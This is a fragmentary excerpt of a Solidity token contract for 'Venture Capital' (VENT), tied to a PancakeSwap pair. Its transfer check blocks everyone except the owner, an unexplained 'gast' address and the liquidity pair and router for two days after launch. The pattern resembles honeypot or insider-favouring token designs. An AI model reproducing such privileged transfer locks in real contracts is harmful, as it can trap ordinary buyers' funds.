...
contract Venture {
    string public name = "Venture Capital";
    string public symbol = "VENT";
    ...
    address public gast;
    address public PancakeLP = 0xe0878b31B598085610d9B3D066C0F70D8f9376b3;
    ...
    function transfer(address _to, uint256 _value) public returns (bool success) {
        ...
        require((msg.sender == owner) || (msg.sender == gast) || (msg.sender == PancakeLP) || (msg.sender == PancakeRouter) || (block.timestamp >= (startTime + 2 days)), "2 days left to launch!");
